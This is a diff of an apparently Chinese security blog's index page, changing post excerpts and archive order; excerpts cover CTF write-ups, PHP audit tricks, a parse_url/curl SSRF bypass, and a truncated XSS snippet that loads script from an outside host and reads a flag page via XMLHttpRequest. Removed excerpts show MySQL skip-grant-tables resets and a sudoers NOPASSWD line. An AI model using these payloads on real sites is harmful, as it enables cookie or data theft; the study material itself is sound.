@@ -341,196 +341,28 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href="/posts/17498/">
+        <a class="abstract-title" href="/posts/23527/">
             
-                <span>mysql忘记密码/修改密码</span>
+                <span>phpinfo解读</span>
         </a>
         <div class="abstract-content">
-            
-关闭mysql
+            phpinfo解读我们以 链接：phpinfo() 为例来讲解吧。— 来源于 @phith0n师傅
+版本更迭phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。
+ PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：
 
-service mysql stop
-
-
-无密码登录msyql
-
-mysqld_safe –skip-grant-tables &amp;  
-
-
-root连接mysql
-
-mysql -u root
-
-
-修改密码
-
-use mysql
-update user set password=PASSWORD(‘admin’) where User=’root’;  
-
-
-刷新权限
-
-flush privileges;
-
-
-重启mysql
-
-service msyql restart
-
-
-
-
+移除不支持SQL预编译的Mysql扩展：mysql 
+移除preg_replace中容易导致代码执行漏洞的...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/29</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/22</span>
             </div>
             <!-- tags  -->
             
             <div class="abstract-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="mysql">mysql</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/56136/">
-            
-                <span>普通用户免密码切换到root</span>
-        </a>
-        <div class="abstract-content">
-            
-sudo vim /etc/sudoers
-
-添加一行:
-
-tiandiwuji  ALL=(ALL)       NOPASSWD: ALL
-
-
-
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/29</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="linux">linux</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/62889/">
-            
-                <span>docker使用手册</span>
-        </a>
-        <div class="abstract-content">
-            Docker命令
-列出所有镜像
-
-docker images -a
-
-
-构建镜像
-
- docker build -t [镜像名称]   [Dockerfile所在目录]
-
-
-运行镜像
-
-docker run –name [容器名称(可选)] -d -p 80:8080 [镜像名称]
-
-
-查看镜像状态
-
-docker stats
-
-
-显示所有的容器，包括未运行的
-
-docker ps -a
-
-
-显示所有容器ID
-
-docker ps -a -q
-
-
-停止运行
-
-docker stop [容器名称]
-
-
-删除容器
-
-docker rm [容器名称]
-docker rm [容器ID]
-
-
-删除...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/29</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="工具手册">工具手册</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/26365/">
-            
-                <span>suctf2018</span>
-        </a>
-        <div class="abstract-content">
-            SUCTF2018赛后总结
-docker仓库：
-12345678910111213141516suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymoussuctf/2018-pwn-notesuctf/2018-pwn-noendsuctf/2018-pwn-lock2suctf/2018-pwn-heapprintsuctf/2018-pwn-heapsuctf/2018-misc-paddingsuctf/201...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
     
 </div>
             
@@ -562,41 +394,6 @@ r-cursive源代码:
             <div class="abstract-tags">
     
         <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/23527/">
-            
-                <span>phpinfo解读</span>
-        </a>
-        <div class="abstract-content">
-            phpinfo解读我们以 链接：phpinfo() 为例来讲解吧。
-版本更迭phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。
- PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：
-
-移除不支持SQL预编译的Mysql扩展：mysql 
-移除preg_replace中容易导致代码执行漏洞的正则模式：e 
-assert从一...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/22</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
     
 </div>
             
@@ -741,6 +538,130 @@ a = “456e”
             <!-- date  -->
             <div class="abstract-date">
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/24</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/15636/">
+            
+                <span>parse_url + curl</span>
+        </a>
+        <div class="abstract-content">
+            parse_url + curlLet’s open the URL and prod around. We find a search box, which can retrieve the source code of any page on https://www.google.com.
+
+Different hostnames are all blocked. Examples are:
+evil.com 
+hostnames that include www.google.com such as www.google.com.evil.com 
+URLs that includ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/22230/">
+            
+                <span>ddctf2018</span>
+        </a>
+        <div class="abstract-content">
+            签到题目:复制，粘贴
+(╯°□°）╯︵ ┻━┻题目给了一个字符串1d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd
+首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，”DD”两个字符，在字符串中找到两组相邻的字符串，找到了”c4c4”和”e1e1”：
+d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/20</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/65402/">
+            
+                <span>PHP代码审计归纳</span>
+        </a>
+        <div class="abstract-content">
+            PHP代码审计归纳Author: 木禾 ali0th
+https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md
+函数trickunlink:不会删除/.结尾的文件
+unlink(“index.php/.”);  这样并不会删除index.php
+parse_url1if(isset($_POST[&apos;url&apos;]) &amp;&amp; parse_url($_POST[&ap...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/52452/">
+            
+                <span>xss</span>
+        </a>
+        <div class="abstract-content">
+            link 标签引入外部 js。
+123也可以用域名，将 . 用 。 代替。&lt;link rel=import href=\\八进制ip&lt;link/rel=import href=https:\\d7cb7b72.w1n.pw\background.html&gt;
+1234567&lt;script&gt;  var xhr = new XMLHttpRequest();  xhr.open("GET", "https://router.vip/flag.php", false);  xhr.send();  a=xhr.responseText;  location.href...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/27</span>
             </div>
             <!-- tags  -->
             
@@ -2094,9 +2015,95 @@ a = “456e”
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 81
+        Total : 79
         </div>
         <!-- search  -->
         
@@ -2126,17 +2133,27 @@ a = “456e”
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/posts/43363/">java-面试准备</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href="/posts/44754/">dubbo-配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">01/12</span><a class="archive-post-title" href="/posts/8880/">Thinkphp5.0.*之RCE漏洞分析</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/41682/">设计模式</a>
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/53933/">剑指ofer</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/53933/">剑指ofer</a>
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/41682/">设计模式</a>
         </li>
     
     
@@ -2161,11 +2178,6 @@ a = “456e”
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/21</span><a class="archive-post-title" href="/posts/24928/">软件安装相关问题</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/33972/">otter-ctf</a>
         </li>
     
     
@@ -2215,11 +2227,6 @@ a = “456e”
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
         </li>
     
@@ -2231,11 +2238,6 @@ a = “456e”
     
         <li class="archive-post-item">
             <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
         </li>
     
     
@@ -2310,12 +2312,12 @@ a = “456e”
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
@@ -2395,11 +2397,6 @@ a = “456e”
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
         </li>
     
@@ -2430,12 +2427,12 @@ a = “456e”
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
@@ -2455,12 +2452,12 @@ a = “456e”
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">linux使用相关</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
@@ -2538,23 +2535,23 @@ a = “456e”
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
-    
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
-        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
